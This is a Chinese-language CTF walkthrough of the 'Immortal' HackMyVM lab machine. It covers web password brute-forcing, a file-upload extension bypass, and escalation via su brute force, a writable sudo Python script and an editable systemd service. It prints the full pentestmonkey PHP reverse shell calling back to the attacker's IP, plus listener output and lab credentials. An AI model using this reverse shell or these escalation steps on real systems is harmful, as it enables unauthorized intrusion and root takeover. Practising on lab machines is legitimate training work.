# 0.简介

**靶机**：[thehackerslabs - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
**难度**：黄色
**目标 IP**：192.168.205.223
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手，先探测端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap 192.168.205.223
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 12:20 CST
Nmap scan report for 192.168.205.223
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

没啥好说的，有ftp服务先尝试匿名登录

# 2.踩点

## port 21

```bash
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.223           
Connected to 192.168.205.223.
220 (vsFTPd 3.0.3)
Name (192.168.205.223:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||52564|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Feb 27  2024 .
drwxr-xr-x    2 0        115          4096 Feb 27  2024 ..
-rw-r--r--    1 0        0             504 Feb 27  2024 message.txt
226 Directory send OK.
ftp> mget message.txt
mget message.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||10512|)
150 Opening BINARY mode data connection for message.txt (504 bytes).
100% |*****************************************************************************************|   504      825.81 KiB/s    00:00 ETA
226 Transfer complete.
504 bytes received in 00:00 (429.10 KiB/s)
ftp> exit
221 Goodbye.                                     
```

查看message.txt文件

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat message.txt 
Hey guys!
I made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. 
Now we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. 
They may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! 
Wishing you a long life, David.
  
嘿,伙计们！
经过这么长时间，我做到了。没错，伙计们，伟大的珍贵不朽。所有人都觊觎而没有人能实现的那个。受到所有人的青睐，没有人拥有。
现在我们必须小心，伙计们，我们必须向世界、政府和其他危险机构隐瞒这件事。
他们甚至可能已经听说了我们的成就，他们无处不在！这就是我决定加强服务器安全性的原因。如果他们试图入侵我们怎么办!!
祝你长寿，大卫。                             
```

没用信息，就获得个用户名David，那进行探测80服务

## port 80

![image](https://github.com/user-attachments/assets/403e1434-4a32-4037-8354-3ba83dd46695)

一个密码输入框，拿burp爆破一下，我这爆的是前5000行的rockyou.txt字典

![image](https://github.com/user-attachments/assets/92adc0f7-16e8-455f-b18d-6d4cb1a4b0ea)

其中密码为santiago，状态码和长度完全不一样，尝试登录


![image](https://github.com/user-attachments/assets/a6468ac6-365a-41f9-896d-c49c4d723309)

一个文件夹目录，其中chat/给了提示

![image](https://github.com/user-attachments/assets/d5afbcdc-152e-4f92-9b4c-a4e8e7876ff1)

上传点在upload_an_incredible_message.php，浅试了一下上传index.phtml不成功，我就直接放burp爆破后缀了

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat index.php  
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.205.141';
$port = 8888;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
  
```

![image](https://github.com/user-attachments/assets/7f2fda33-177d-4a71-9212-9676d959bd66)

![image](https://github.com/user-attachments/assets/8446218d-b24e-4ed0-add6-1f7388617018)

其中index.phtml是可以执行的，到这里我们已经拿到了www-data的shell

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                           
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 50866
Linux Immortal 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 GNU/Linux
 05:32:45 up 12 min,  0 users,  load average: 1.55, 5.77, 3.77
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (490): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Immortal:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@Immortal:/home$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Feb 27  2024 .
drwxr-xr-x 18 root  root  4096 Feb 27  2024 ..
drw-------  2 david david 4096 Feb 29  2024 david
drwxr-xr-x  4 drake drake 4096 Feb 29  2024 drake
drwxr-xr-x  3 eric  eric  4096 Feb 29  2024 eric
www-data@Immortal:/home$ cd drake/
www-data@Immortal:/home/drake$ ls -la
total 32
drwxr-xr-x 4 drake drake 4096 Feb 29  2024 .
drwxr-xr-x 5 root  root  4096 Feb 27  2024 ..
drwxr-xr-x 2 drake drake 4096 Feb 27  2024 ...
-rw-r--r-- 1 drake drake  220 Feb 27  2024 .bash_logout
-rw-r--r-- 1 drake drake 3526 Feb 27  2024 .bashrc
drwxr-xr-x 3 drake drake 4096 Feb 27  2024 .local
-rw-r--r-- 1 drake drake  807 Feb 27  2024 .profile
-rw-r--r-- 1 drake drake   20 Feb 27  2024 user.txt
www-data@Immortal:/home/drake$ cd .../
www-data@Immortal:/home/drake/...$ ls -la
total 12
drwxr-xr-x 2 drake drake 4096 Feb 27  2024 .
drwxr-xr-x 4 drake drake 4096 Feb 29  2024 ..
-rw-r--r-- 1 drake drake  134 Feb 27  2024 pass.txt
www-data@Immortal:/home/drake/...$ cat pass.txt 
netflix : drake123
amazon : 123drake
shelldred : shell123dred (f4ns0nly)
system : kevcjnsgii
bank : myfavouritebank
nintendo : 123456

```

难评，把数据处理一下

```bash
www-data@Immortal:/home/drake/...$ cat pass.txt |awk -F ' ' '{print $1 "\n" $3}'     
netflix
drake123
amazon
123drake
shelldred
shell123dred
system
kevcjnsgii
bank
myfavouritebank
nintendo
123456
www-data@Immortal:/tmp$ echo 'f4ns0nly' >> pass 
www-data@Immortal:/tmp$ cat pass 
netflix
drake123
amazon
123drake
shelldred
shell123dred
system
kevcjnsgii
bank
myfavouritebank
nintendo
123456

f4ns0nly
```

那个空格无伤大雅，拖个suForce爆破密码

```bash
www-data@Immortal:/tmp$ ./suForce -u drake -w pass 
            _____                        
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | drake
📖 Wordlist | pass
🔎 Status   | 8/14/57%/kevcjnsgii
💥 Password | kevcjnsgii
───────────────────────────────────


www-data@Immortal:/tmp$ su - drake   
```

如果它提示没有找到密码可以多试几次，我不知道是不是我suForce的问题，我的会误报

```bash
drake@Immortal:/home$ sudo -l
Matching Defaults entries for drake on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drake may run the following commands on Immortal:
    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py

```

可以用python3执行/opt/immortal.py，/opt/immortal.py我们有编辑权限，直接改就好了，我甩了个反弹shell回去[肥肥瘫]

```bash
eric@Immortal:~$ sudo -l
Matching Defaults entries for eric on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eric may run the following commands on Immortal:
    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
eric@Immortal:~$ sudo sudoedit /etc/systemd/system/immortal.service
```

改个反弹shell上去

![image](https://github.com/user-attachments/assets/03c06f7b-54a5-44f4-9a93-6f98aa26aa5d)

重启一下服务

```bash
eric@Immortal:~$ sudo /usr/bin/systemctl start immortal.service
```

监听

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8899
listening on [any] 8899 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 48726
bash: cannot set terminal process group (15372): Inappropriate ioctl for device
bash: no job control in this shell
root@Immortal:/# id
id
uid=0(root) gid=0(root) groups=0(root)

```